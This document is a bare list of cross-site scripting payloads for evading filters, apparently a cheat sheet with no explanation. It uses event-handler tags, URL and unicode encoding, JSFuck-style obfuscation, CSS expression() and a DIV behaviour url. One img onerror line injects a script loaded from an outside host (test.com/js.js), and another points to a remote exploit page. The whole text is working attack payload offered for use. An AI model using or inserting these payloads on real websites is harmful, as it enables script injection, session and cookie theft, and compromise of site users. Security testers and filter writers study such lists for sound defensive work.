...
<svg onmouseenter="a=alert,a('xss')">

< h1/%6f%6e/oNclicK=alert`hacked` >

"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F

<iframe height="700" src="https://test.com/test.jpg" frameborder="0" width="100%" scrolling="no"></iframe>
...
<svg onload='new Function`["hello"].find(al\u0065rt)`'>
...
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>hello</a>
...
<img src="" onerror="eval(String.fromCharCode(
document.getElementsByTagName('head')[0].appendChild(document.createElement('script')).src='http://test.com/js.js?'（这段代码的10进制）))">
...
<script>X=[![]]+!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[];[][X[0]+X[19]+X[2]+X[2]][X[12]+X[15]+X[11]+X[3]+X[5]+X[6]+X[7]+X[12]+X[5]+X[15]+X[6]](X[1]+X[2]+X[4]+X[6]+X[5]+'('+1+')')()</script>

<html \" onmouseover=/*<svg/*/onload=alert(2)//>

<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>

<svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>

<svg/onload=top[/al/.source+/ert/.source]()>
...
<img/src=%27https://test.com/test.jpg%27%20onmouseover=prompt("_XSS_")
...
<img src=1.gif onerror=alert(test)>
...
<LAYER src="https://www.test.com"></layer>
...
<DIV STYLE="behaviour: url('http://test.com/exploit.html');">
...
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(376))}</style>
